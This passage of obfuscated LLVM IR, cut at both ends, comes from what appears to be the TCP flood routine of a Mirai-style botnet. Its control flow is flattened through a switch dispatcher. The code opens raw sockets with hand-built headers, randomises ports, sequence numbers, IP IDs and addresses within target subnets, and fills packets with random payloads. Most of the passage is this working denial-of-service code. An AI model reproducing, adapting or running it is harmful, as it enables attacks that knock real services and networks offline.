  %127 = getelementptr inbounds %struct.arguments, %struct.arguments* %126, i32 0, i32 2
  %128 = load i8, i8* %127, align 8
  %129 = call zeroext i16 @retrieve_opt_num(%struct.option* %125, i8 zeroext %128, i8 zeroext 17, i16 zeroext -1)
  %130 = zext i16 %129 to i32
  store i32 %130, i32* %18, align 4
  %131 = load %struct.arguments*, %struct.arguments** %2, align 8
  %132 = getelementptr inbounds %struct.arguments, %struct.arguments* %131, i32 0, i32 1
  %133 = load %struct.option*, %struct.option** %132, align 8
  %134 = load %struct.arguments*, %struct.arguments** %2, align 8
  %135 = getelementptr inbounds %struct.arguments, %struct.arguments* %134, i32 0, i32 2
  %136 = load i8, i8* %135, align 8
  %137 = load i32, i32* @LOCAL_ADDRESS, align 4
  %138 = call i32 @retrieve_opt_ipv4(%struct.option* %133, i8 zeroext %136, i8 zeroext 18, i32 %137)
  store i32 %138, i32* %19, align 4
  %139 = load %struct.arguments*, %struct.arguments** %2, align 8
  %140 = getelementptr inbounds %struct.arguments, %struct.arguments* %139, i32 0, i32 1
  %141 = load %struct.option*, %struct.option** %140, align 8
  %142 = load %struct.arguments*, %struct.arguments** %2, align 8
  %143 = getelementptr inbounds %struct.arguments, %struct.arguments* %142, i32 0, i32 2
  %144 = load i8, i8* %143, align 8
  %145 = call zeroext i16 @retrieve_opt_num(%struct.option* %141, i8 zeroext %144, i8 zeroext 19, i16 zeroext -1)
  %146 = zext i16 %145 to i32
  store i32 %146, i32* %20, align 4
  %147 = load %struct.arguments*, %struct.arguments** %2, align 8
  %148 = getelementptr inbounds %struct.arguments, %struct.arguments* %147, i32 0, i32 1
  %149 = load %struct.option*, %struct.option** %148, align 8
  %150 = load %struct.arguments*, %struct.arguments** %2, align 8
  %151 = getelementptr inbounds %struct.arguments, %struct.arguments* %150, i32 0, i32 2
  %152 = load i8, i8* %151, align 8
  %153 = call i8* @retrieve_opt_str(%struct.option* %149, i8 zeroext %152, i8 zeroext 6, i8* null)
  store i8* %153, i8** %21, align 8
  %154 = load %struct.arguments*, %struct.arguments** %2, align 8
  %155 = getelementptr inbounds %struct.arguments, %struct.arguments* %154, i32 0, i32 1
  %156 = load %struct.option*, %struct.option** %155, align 8
  %157 = load %struct.arguments*, %struct.arguments** %2, align 8
  %158 = getelementptr inbounds %struct.arguments, %struct.arguments* %157, i32 0, i32 2
  %159 = load i8, i8* %158, align 8
  %160 = call i8* @retrieve_opt_str(%struct.option* %156, i8 zeroext %159, i8 zeroext 22, i8* inttoptr (i64 1 to i8*))
  %161 = ptrtoint i8* %160 to i32
  store i32 %161, i32* %23, align 4
  %162 = load %struct.arguments*, %struct.arguments** %2, align 8
  %163 = getelementptr inbounds %struct.arguments, %struct.arguments* %162, i32 0, i32 3
  %164 = load i8, i8* %163, align 1
  %165 = zext i8 %164 to i64
  %166 = call noalias i8* @calloc(i64 %165, i64 8) #8
  %167 = bitcast i8* %166 to i8**
  store i8** %167, i8*** %9, align 8
  %168 = load i8**, i8*** %9, align 8
  store i8** %168, i8*** %.reg2mem
  %switchVar = alloca i32
  store i32 1631849963, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1631849963, label %first
    i32 -1278793463, label %171
    i32 -701718247, label %172
    i32 -26102840, label %182
    i32 760797075, label %183
    i32 -424119846, label %184
    i32 2127363501, label %192
    i32 1549822354, label %205
    i32 2014551931, label %208
    i32 1342836630, label %218
    i32 863354025, label %221
    i32 357853915, label %225
    i32 928629492, label %244
    i32 -971380753, label %261
    i32 -2073947260, label %264
    i32 1441728317, label %432
    i32 587610540, label %435
    i32 -294014753, label %436
    i32 -1609467991, label %437
    i32 -1338812816, label %445
    i32 -2011008624, label %466
    i32 -983186822, label %486
    i32 1970032619, label %492
    i32 -1100789270, label %496
    i32 62484242, label %503
    i32 -1095709660, label %509
    i32 -1159077548, label %518
    i32 327708929, label %526
    i32 1775504391, label %535
    i32 -1921789977, label %543
    i32 -1407774576, label %551
    i32 1937322527, label %558
    i32 -734531728, label %566
    i32 1220597111, label %573
    i32 -1417223057, label %632
    i32 1346719653, label %635
    i32 408528104, label %636
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8**, i8*** %.reg2mem
  %169 = icmp ne i8** %.reload, null
  %170 = select i1 %169, i32 -701718247, i32 -1278793463
  store i32 %170, i32* %switchVar
  br label %loopEnd

; <label>:171:                                    ; preds = %loopEntry
  call void @exit(i32 1) #10
  unreachable

; <label>:172:                                    ; preds = %loopEntry
  %173 = load %struct.arguments*, %struct.arguments** %2, align 8
  %174 = getelementptr inbounds %struct.arguments, %struct.arguments* %173, i32 0, i32 3
  %175 = load i8, i8* %174, align 1
  %176 = zext i8 %175 to i64
  %177 = call noalias i8* @calloc(i64 %176, i64 4) #8
  %178 = bitcast i8* %177 to i32*
  store i32* %178, i32** %22, align 8
  %179 = load i32*, i32** %22, align 8
  %180 = icmp ne i32* %179, null
  %181 = select i1 %180, i32 760797075, i32 -26102840
  store i32 %181, i32* %switchVar
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  call void @exit(i32 1) #10
  unreachable

; <label>:183:                                    ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 -424119846, i32* %switchVar
  br label %loopEnd

; <label>:184:                                    ; preds = %loopEntry
  %185 = load i32, i32* %3, align 4
  %186 = load %struct.arguments*, %struct.arguments** %2, align 8
  %187 = getelementptr inbounds %struct.arguments, %struct.arguments* %186, i32 0, i32 3
  %188 = load i8, i8* %187, align 1
  %189 = zext i8 %188 to i32
  %190 = icmp slt i32 %185, %189
  %191 = select i1 %190, i32 2127363501, i32 587610540
  store i32 %191, i32* %switchVar
  br label %loopEnd

; <label>:192:                                    ; preds = %loopEntry
  %193 = call i32 @socket(i32 2, i32 3, i32 6) #8
  %194 = load i32*, i32** %22, align 8
  %195 = load i32, i32* %3, align 4
  %196 = sext i32 %195 to i64
  %197 = getelementptr inbounds i32, i32* %194, i64 %196
  store i32 %193, i32* %197, align 4
  %198 = load i32*, i32** %22, align 8
  %199 = load i32, i32* %3, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds i32, i32* %198, i64 %200
  %202 = load i32, i32* %201, align 4
  %203 = icmp eq i32 %202, -1
  %204 = select i1 %203, i32 1549822354, i32 2014551931
  store i32 %204, i32* %switchVar
  br label %loopEnd

; <label>:205:                                    ; preds = %loopEntry
  %206 = load i8**, i8*** %9, align 8
  %207 = bitcast i8** %206 to i8*
  call void @free(i8* %207) #8
  call void @exit(i32 1) #10
  unreachable

; <label>:208:                                    ; preds = %loopEntry
  store i32 1, i32* %4, align 4
  %209 = load i32*, i32** %22, align 8
  %210 = load i32, i32* %3, align 4
  %211 = sext i32 %210 to i64
  %212 = getelementptr inbounds i32, i32* %209, i64 %211
  %213 = load i32, i32* %212, align 4
  %214 = bitcast i32* %4 to i8*
  %215 = call i32 @setsockopt(i32 %213, i32 0, i32 3, i8* %214, i32 4) #8
  %216 = icmp eq i32 %215, -1
  %217 = select i1 %216, i32 1342836630, i32 863354025
  store i32 %217, i32* %switchVar
  br label %loopEnd

; <label>:218:                                    ; preds = %loopEntry
  %219 = load i8**, i8*** %9, align 8
  %220 = bitcast i8** %219 to i8*
  call void @free(i8* %220) #8
  call void @exit(i32 1) #10
  unreachable

; <label>:221:                                    ; preds = %loopEntry
  %222 = load i32, i32* %23, align 4
  %223 = icmp ne i32 %222, 0
  %224 = select i1 %223, i32 357853915, i32 928629492
  store i32 %224, i32* %switchVar
  br label %loopEnd

; <label>:225:                                    ; preds = %loopEntry
  %226 = load i16, i16* %6, align 2
  %227 = load i32*, i32** %22, align 8
  %228 = load i32, i32* %3, align 4
  %229 = sext i32 %228 to i64
  %230 = getelementptr inbounds i32, i32* %227, i64 %229
  %231 = load i32, i32* %230, align 4
  %232 = load %struct.arguments*, %struct.arguments** %2, align 8
  %233 = getelementptr inbounds %struct.arguments, %struct.arguments* %232, i32 0, i32 0
  %234 = load %struct.target*, %struct.target** %233, align 8
  %235 = load i32, i32* %3, align 4
  %236 = sext i32 %235 to i64
  %237 = getelementptr inbounds %struct.target, %struct.target* %234, i64 %236
  %238 = getelementptr inbounds %struct.target, %struct.target* %237, i32 0, i32 0
  %239 = load i32, i32* %238, align 4
  %240 = load i32, i32* %19, align 4
  %241 = load i16, i16* %8, align 2
  %242 = zext i16 %241 to i32
  %243 = call i32 @tcp_handshake(i16 zeroext %226, i32 %231, i32 %239, i32 %240, i32 %242)
  store i32 928629492, i32* %switchVar
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  %245 = load i16, i16* %5, align 2
  %246 = zext i16 %245 to i32
  %247 = add nsw i32 %246, 110
  %248 = sext i32 %247 to i64
  %249 = call noalias i8* @malloc(i64 %248) #8
  %250 = load i8**, i8*** %9, align 8
  %251 = load i32, i32* %3, align 4
  %252 = sext i32 %251 to i64
  %253 = getelementptr inbounds i8*, i8** %250, i64 %252
  store i8* %249, i8** %253, align 8
  %254 = load i8**, i8*** %9, align 8
  %255 = load i32, i32* %3, align 4
  %256 = sext i32 %255 to i64
  %257 = getelementptr inbounds i8*, i8** %254, i64 %256
  %258 = load i8*, i8** %257, align 8
  %259 = icmp ne i8* %258, null
  %260 = select i1 %259, i32 -2073947260, i32 -971380753
  store i32 %260, i32* %switchVar
  br label %loopEnd

; <label>:261:                                    ; preds = %loopEntry
  %262 = load i8**, i8*** %9, align 8
  %263 = bitcast i8** %262 to i8*
  call void @free(i8* %263) #8
  call void @exit(i32 1) #10
  unreachable

; <label>:264:                                    ; preds = %loopEntry
  %265 = load i8**, i8*** %9, align 8
  %266 = load i32, i32* %3, align 4
  %267 = sext i32 %266 to i64
  %268 = getelementptr inbounds i8*, i8** %265, i64 %267
  %269 = load i8*, i8** %268, align 8
  %270 = bitcast i8* %269 to %struct.iphdr*
  store %struct.iphdr* %270, %struct.iphdr** %24, align 8
  %271 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %272 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %271, i64 1
  %273 = bitcast %struct.iphdr* %272 to %struct.tcphdr*
  store %struct.tcphdr* %273, %struct.tcphdr** %25, align 8
  %274 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %275 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %274, i64 1
  %276 = bitcast %struct.tcphdr* %275 to i8*
  store i8* %276, i8** %26, align 8
  %277 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %278 = bitcast %struct.iphdr* %277 to i8*
  %279 = load i8, i8* %278, align 4
  %280 = and i8 %279, 15
  %281 = or i8 %280, 64
  store i8 %281, i8* %278, align 4
  %282 = load i8, i8* %16, align 1
  %283 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %284 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %283, i32 0, i32 1
  store i8 %282, i8* %284, align 1
  %285 = load i16, i16* %5, align 2
  %286 = zext i16 %285 to i64
  %287 = add i64 40, %286
  %288 = trunc i64 %287 to i16
  %289 = call zeroext i16 @htons(i16 zeroext %288) #9
  %290 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %291 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %290, i32 0, i32 2
  store i16 %289, i16* %291, align 2
  %292 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %293 = bitcast %struct.iphdr* %292 to i8*
  %294 = load i8, i8* %293, align 4
  %295 = and i8 %294, -16
  %296 = or i8 %295, 5
  store i8 %296, i8* %293, align 4
  %297 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %298 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %297, i32 0, i32 4
  store i16 0, i16* %298, align 2
  %299 = load i8, i8* %7, align 1
  %300 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %301 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %300, i32 0, i32 5
  store i8 %299, i8* %301, align 4
  %302 = load i16, i16* %17, align 2
  %303 = call zeroext i16 @htons(i16 zeroext %302) #9
  %304 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %305 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %304, i32 0, i32 3
  store i16 %303, i16* %305, align 4
  %306 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %307 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %306, i32 0, i32 6
  store i8 6, i8* %307, align 1
  %308 = load i32, i32* %19, align 4
  %309 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %310 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %309, i32 0, i32 8
  store i32 %308, i32* %310, align 4
  %311 = load %struct.arguments*, %struct.arguments** %2, align 8
  %312 = getelementptr inbounds %struct.arguments, %struct.arguments* %311, i32 0, i32 0
  %313 = load %struct.target*, %struct.target** %312, align 8
  %314 = load i32, i32* %3, align 4
  %315 = sext i32 %314 to i64
  %316 = getelementptr inbounds %struct.target, %struct.target* %313, i64 %315
  %317 = getelementptr inbounds %struct.target, %struct.target* %316, i32 0, i32 0
  %318 = load i32, i32* %317, align 4
  %319 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %320 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %319, i32 0, i32 9
  store i32 %318, i32* %320, align 4
  %321 = load i16, i16* %6, align 2
  %322 = call zeroext i16 @htons(i16 zeroext %321) #9
  %323 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %324 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %323, i32 0, i32 0
  %325 = bitcast %union.anon* %324 to %struct.anon.0*
  %326 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %325, i32 0, i32 1
  store i16 %322, i16* %326, align 2
  %327 = load i16, i16* %8, align 2
  %328 = call zeroext i16 @htons(i16 zeroext %327) #9
  %329 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %330 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %329, i32 0, i32 0
  %331 = bitcast %union.anon* %330 to %struct.anon.0*
  %332 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %331, i32 0, i32 0
  store i16 %328, i16* %332, align 4
  %333 = load i32, i32* %18, align 4
  %334 = trunc i32 %333 to i16
  %335 = call zeroext i16 @htons(i16 zeroext %334) #9
  %336 = zext i16 %335 to i32
  %337 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %338 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %337, i32 0, i32 0
  %339 = bitcast %union.anon* %338 to %struct.anon.0*
  %340 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %339, i32 0, i32 2
  store i32 %336, i32* %340, align 4
  %341 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %342 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %341, i32 0, i32 0
  %343 = bitcast %union.anon* %342 to %struct.anon.0*
  %344 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %343, i32 0, i32 4
  %345 = load i16, i16* %344, align 4
  %346 = and i16 %345, -241
  %347 = or i16 %346, 80
  store i16 %347, i16* %344, align 4
  %348 = load i8, i8* %10, align 1
  %349 = sext i8 %348 to i16
  %350 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %351 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %350, i32 0, i32 0
  %352 = bitcast %union.anon* %351 to %struct.anon.0*
  %353 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %352, i32 0, i32 4
  %354 = load i16, i16* %353, align 4
  %355 = and i16 %349, 1
  %356 = shl i16 %355, 12
  %357 = and i16 %354, -4097
  %358 = or i16 %357, %356
  store i16 %358, i16* %353, align 4
  %359 = load i8, i8* %11, align 1
  %360 = sext i8 %359 to i16
  %361 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %362 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %361, i32 0, i32 0
  %363 = bitcast %union.anon* %362 to %struct.anon.0*
  %364 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %363, i32 0, i32 4
  %365 = load i16, i16* %364, align 4
  %366 = and i16 %360, 1
  %367 = shl i16 %366, 8
  %368 = and i16 %365, -257
  %369 = or i16 %368, %367
  store i16 %369, i16* %364, align 4
  %370 = load i8, i8* %12, align 1
  %371 = sext i8 %370 to i16
  %372 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %373 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %372, i32 0, i32 0
  %374 = bitcast %union.anon* %373 to %struct.anon.0*
  %375 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %374, i32 0, i32 4
  %376 = load i16, i16* %375, align 4
  %377 = and i16 %371, 1
  %378 = shl i16 %377, 13
  %379 = and i16 %376, -8193
  %380 = or i16 %379, %378
  store i16 %380, i16* %375, align 4
  %381 = load i8, i8* %13, align 1
  %382 = sext i8 %381 to i16
  %383 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %384 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %383, i32 0, i32 0
  %385 = bitcast %union.anon* %384 to %struct.anon.0*
  %386 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %385, i32 0, i32 4
  %387 = load i16, i16* %386, align 4
  %388 = and i16 %382, 1
  %389 = shl i16 %388, 11
  %390 = and i16 %387, -2049
  %391 = or i16 %390, %389
  store i16 %391, i16* %386, align 4
  %392 = load i8, i8* %14, align 1
  %393 = sext i8 %392 to i16
  %394 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %395 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %394, i32 0, i32 0
  %396 = bitcast %union.anon* %395 to %struct.anon.0*
  %397 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %396, i32 0, i32 4
  %398 = load i16, i16* %397, align 4
  %399 = and i16 %393, 1
  %400 = shl i16 %399, 10
  %401 = and i16 %398, -1025
  %402 = or i16 %401, %400
  store i16 %402, i16* %397, align 4
  %403 = load i8, i8* %15, align 1
  %404 = sext i8 %403 to i16
  %405 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %406 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %405, i32 0, i32 0
  %407 = bitcast %union.anon* %406 to %struct.anon.0*
  %408 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %407, i32 0, i32 4
  %409 = load i16, i16* %408, align 4
  %410 = and i16 %404, 1
  %411 = shl i16 %410, 9
  %412 = and i16 %409, -513
  %413 = or i16 %412, %411
  store i16 %413, i16* %408, align 4
  %414 = call i32 @rand_new()
  %415 = and i32 %414, 65535
  %416 = trunc i32 %415 to i16
  %417 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %418 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %417, i32 0, i32 0
  %419 = bitcast %union.anon* %418 to %struct.anon.0*
  %420 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %419, i32 0, i32 5
  store i16 %416, i16* %420, align 2
  %421 = load i32, i32* %20, align 4
  %422 = trunc i32 %421 to i16
  %423 = call zeroext i16 @htons(i16 zeroext %422) #9
  %424 = zext i16 %423 to i32
  %425 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %426 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %425, i32 0, i32 0
  %427 = bitcast %union.anon* %426 to %struct.anon.0*
  %428 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %427, i32 0, i32 3
  store i32 %424, i32* %428, align 4
  %429 = load i8*, i8** %26, align 8
  %430 = load i16, i16* %5, align 2
  %431 = zext i16 %430 to i32
  call void @rand_string(i8* %429, i32 %431)
  store i32 1441728317, i32* %switchVar
  br label %loopEnd

; <label>:432:                                    ; preds = %loopEntry
  %433 = load i32, i32* %3, align 4
  %434 = add nsw i32 %433, 1
  store i32 %434, i32* %3, align 4
  store i32 -424119846, i32* %switchVar
  br label %loopEnd

; <label>:435:                                    ; preds = %loopEntry
  store i32 -294014753, i32* %switchVar
  br label %loopEnd

; <label>:436:                                    ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 -1609467991, i32* %switchVar
  br label %loopEnd

; <label>:437:                                    ; preds = %loopEntry
  %438 = load i32, i32* %3, align 4
  %439 = load %struct.arguments*, %struct.arguments** %2, align 8
  %440 = getelementptr inbounds %struct.arguments, %struct.arguments* %439, i32 0, i32 3
  %441 = load i8, i8* %440, align 1
  %442 = zext i8 %441 to i32
  %443 = icmp slt i32 %438, %442
  %444 = select i1 %443, i32 -1338812816, i32 1346719653
  store i32 %444, i32* %switchVar
  br label %loopEnd

; <label>:445:                                    ; preds = %loopEntry
  %446 = load i8**, i8*** %9, align 8
  %447 = load i32, i32* %3, align 4
  %448 = sext i32 %447 to i64
  %449 = getelementptr inbounds i8*, i8** %446, i64 %448
  %450 = load i8*, i8** %449, align 8
  %451 = bitcast i8* %450 to %struct.iphdr*
  store %struct.iphdr* %451, %struct.iphdr** %27, align 8
  %452 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %453 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %452, i64 1
  %454 = bitcast %struct.iphdr* %453 to %struct.tcphdr*
  store %struct.tcphdr* %454, %struct.tcphdr** %28, align 8
  %455 = load %struct.arguments*, %struct.arguments** %2, align 8
  %456 = getelementptr inbounds %struct.arguments, %struct.arguments* %455, i32 0, i32 0
  %457 = load %struct.target*, %struct.target** %456, align 8
  %458 = load i32, i32* %3, align 4
  %459 = sext i32 %458 to i64
  %460 = getelementptr inbounds %struct.target, %struct.target* %457, i64 %459
  %461 = getelementptr inbounds %struct.target, %struct.target* %460, i32 0, i32 1
  %462 = load i16, i16* %461, align 4
  %463 = zext i16 %462 to i32
  %464 = icmp slt i32 %463, 32
  %465 = select i1 %464, i32 -2011008624, i32 -983186822
  store i32 %465, i32* %switchVar
  br label %loopEnd

; <label>:466:                                    ; preds = %loopEntry
  %467 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %468 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %467, i32 0, i32 9
  %469 = load i32, i32* %468, align 4
  %470 = call i32 @ntohl(i32 %469) #9
  %471 = call i32 @rand_new()
  %472 = load %struct.arguments*, %struct.arguments** %2, align 8
  %473 = getelementptr inbounds %struct.arguments, %struct.arguments* %472, i32 0, i32 0
  %474 = load %struct.target*, %struct.target** %473, align 8
  %475 = load i32, i32* %3, align 4
  %476 = sext i32 %475 to i64
  %477 = getelementptr inbounds %struct.target, %struct.target* %474, i64 %476
  %478 = getelementptr inbounds %struct.target, %struct.target* %477, i32 0, i32 1
  %479 = load i16, i16* %478, align 4
  %480 = zext i16 %479 to i32
  %481 = lshr i32 %471, %480
  %482 = add i32 %470, %481
  %483 = call i32 @htonl(i32 %482) #9
  %484 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %485 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %484, i32 0, i32 9
  store i32 %483, i32* %485, align 4
  store i32 -983186822, i32* %switchVar
  br label %loopEnd

; <label>:486:                                    ; preds = %loopEntry
  %487 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %488 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %487, i32 0, i32 8
  %489 = load i32, i32* %488, align 4
  %490 = icmp eq i32 %489, -1
  %491 = select i1 %490, i32 1970032619, i32 -1100789270
  store i32 %491, i32* %switchVar
  br label %loopEnd

; <label>:492:                                    ; preds = %loopEntry
  %493 = call i32 @rand_new()
  %494 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %495 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %494, i32 0, i32 8
  store i32 %493, i32* %495, align 4
  store i32 -1100789270, i32* %switchVar
  br label %loopEnd

; <label>:496:                                    ; preds = %loopEntry
  %497 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %498 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %497, i32 0, i32 3
  %499 = load i16, i16* %498, align 4
  %500 = zext i16 %499 to i32
  %501 = icmp eq i32 %500, 65535
  %502 = select i1 %501, i32 62484242, i32 -1095709660
  store i32 %502, i32* %switchVar
  br label %loopEnd

; <label>:503:                                    ; preds = %loopEntry
  %504 = call i32 @rand_new()
  %505 = and i32 %504, 65535
  %506 = trunc i32 %505 to i16
  %507 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %508 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %507, i32 0, i32 3
  store i16 %506, i16* %508, align 4
  store i32 -1095709660, i32* %switchVar
  br label %loopEnd

; <label>:509:                                    ; preds = %loopEntry
  %510 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %511 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %510, i32 0, i32 0
  %512 = bitcast %union.anon* %511 to %struct.anon.0*
  %513 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %512, i32 0, i32 1
  %514 = load i16, i16* %513, align 2
  %515 = zext i16 %514 to i32
  %516 = icmp eq i32 %515, 65535
  %517 = select i1 %516, i32 -1159077548, i32 327708929
  store i32 %517, i32* %switchVar
  br label %loopEnd

; <label>:518:                                    ; preds = %loopEntry
  %519 = call i32 @rand_new()
  %520 = and i32 %519, 65535
  %521 = trunc i32 %520 to i16
  %522 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %523 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %522, i32 0, i32 0
  %524 = bitcast %union.anon* %523 to %struct.anon.0*
  %525 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %524, i32 0, i32 1
  store i16 %521, i16* %525, align 2
  store i32 327708929, i32* %switchVar
  br label %loopEnd

; <label>:526:                                    ; preds = %loopEntry
  %527 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %528 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %527, i32 0, i32 0
  %529 = bitcast %union.anon* %528 to %struct.anon.0*
  %530 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %529, i32 0, i32 0
  %531 = load i16, i16* %530, align 4
  %532 = zext i16 %531 to i32
  %533 = icmp eq i32 %532, 65535
  %534 = select i1 %533, i32 1775504391, i32 -1921789977
  store i32 %534, i32* %switchVar
  br label %loopEnd

; <label>:535:                                    ; preds = %loopEntry
  %536 = call i32 @rand_new()
  %537 = and i32 %536, 65535
  %538 = trunc i32 %537 to i16
  %539 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %540 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %539, i32 0, i32 0
  %541 = bitcast %union.anon* %540 to %struct.anon.0*
  %542 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %541, i32 0, i32 0
  store i16 %538, i16* %542, align 4
  store i32 -1921789977, i32* %switchVar
  br label %loopEnd

; <label>:543:                                    ; preds = %loopEntry
  %544 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %545 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %544, i32 0, i32 0
  %546 = bitcast %union.anon* %545 to %struct.anon.0*
  %547 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %546, i32 0, i32 2
  %548 = load i32, i32* %547, align 4
  %549 = icmp eq i32 %548, 65535
  %550 = select i1 %549, i32 -1407774576, i32 1937322527
  store i32 %550, i32* %switchVar
  br label %loopEnd

; <label>:551:                                    ; preds = %loopEntry
  %552 = call i32 @rand_new()
  %553 = and i32 %552, 65535
  %554 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %555 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %554, i32 0, i32 0
  %556 = bitcast %union.anon* %555 to %struct.anon.0*
  %557 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %556, i32 0, i32 2
  store i32 %553, i32* %557, align 4
  store i32 1937322527, i32* %switchVar
  br label %loopEnd

; <label>:558:                                    ; preds = %loopEntry
  %559 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %560 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %559, i32 0, i32 0
  %561 = bitcast %union.anon* %560 to %struct.anon.0*
  %562 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %561, i32 0, i32 3
  %563 = load i32, i32* %562, align 4
  %564 = icmp eq i32 %563, 65535
  %565 = select i1 %564, i32 -734531728, i32 1220597111
  store i32 %565, i32* %switchVar
  br label %loopEnd

; <label>:566:                                    ; preds = %loopEntry
  %567 = call i32 @rand_new()
  %568 = and i32 %567, 65535
  %569 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %570 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %569, i32 0, i32 0
  %571 = bitcast %union.anon* %570 to %struct.anon.0*
  %572 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %571, i32 0, i32 3
  store i32 %568, i32* %572, align 4
  store i32 1220597111, i32* %switchVar
  br label %loopEnd

; <label>:573:                                    ; preds = %loopEntry
  %574 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %575 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %574, i32 0, i32 7
  store i16 0, i16* %575, align 2
  %576 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %577 = bitcast %struct.iphdr* %576 to i16*
  %578 = call zeroext i16 @ip_header_checksum(i16* %577, i32 20)
  %579 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %580 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %579, i32 0, i32 7
  store i16 %578, i16* %580, align 2
  %581 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
